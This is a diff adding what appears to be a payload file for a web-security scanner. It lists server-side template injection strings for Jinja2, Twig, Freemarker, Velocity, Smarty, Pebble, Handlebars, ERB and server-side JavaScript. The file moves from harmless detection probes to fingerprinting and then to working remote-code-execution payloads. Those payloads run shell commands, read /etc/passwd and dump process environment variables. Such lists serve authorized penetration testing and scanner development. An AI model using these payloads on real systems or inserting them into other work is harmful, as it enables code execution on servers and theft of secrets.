@@ -1,0 +1,78 @@
+# WebSecure SSTI Payload List — All major template engines
+# ── Tier 1: Polyglot detection (eval = 49) ──
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+[=7*7=]
+(= 7*7 =)
+${{7*7}}
+#{7*7}
+*{7*7}
+@(7*7)
+{7*7}
+# ── Tier 2: Engine fingerprinting ──
+# Jinja2 / Twig
+{{7*'7'}}
+{{config}}
+{{self}}
+{{request}}
+{{''.__class__}}
+{{''.__class__.__mro__}}
+# Mako
+${7*7}
+<%=7*7%>
+<%import os%>${os.system('id')}
+# Freemarker
+${7*7}
+<#assign x=7*7>${x}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation()}
+# Velocity
+#set($x = 7*7)${x}
+$class.inspect("java.lang.Runtime",0).type.getRuntime().exec("id")
+# Thymeleaf
+[[${7*7}]]
+[(${7*7})]
+th:text="${7*7}"
+# Smarty
+{7*7}
+{$smarty.version}
+{php}echo `id`;{/php}
+# Pebble (Java)
+{{7*7}}
+{%set x=7*7%}{{x}}
+# Tornado / Python
+{{7*7}}
+{%import os%}{{os.popen("id").read()}}
+# Handlebars (Node.js)
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id').toString()"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+# ERB (Ruby)
+<%= 7*7 %>
+<%= `id` %>
+<%= system("id") %>
+<%= File.read('/etc/passwd') %>
+# ── Tier 3: RCE (after engine confirmed) ──
+# Jinja2 RCE
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.class.mro()[1].subclasses()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+# Twig RCE
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|map('system')|join}}
+{{['id',""]|sort('system')|join}}
+# Freemarker RCE
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+# Velocity RCE
+#set($str=$class.inspect("java.lang.String",0).type)
+#set($chr=$class.inspect("java.lang.Character",0).type)
+#set($ex=$class.inspect("java.lang.Runtime",0).type.getRuntime().exec("id"))
+# Pebble RCE
+{%import java.util.*%}{%set cmd=new java.util.Scanner((new java.lang.ProcessBuilder(new String[]{"id"})).start().getInputStream())%}{{cmd.useDelimiter("\\A").next()}}
+# SSJS (Server-side JS)
+{{constructor.constructor('return process.env')()}}
+{{constructor.constructor('return require("child_process").execSync("id").toString()')()}}
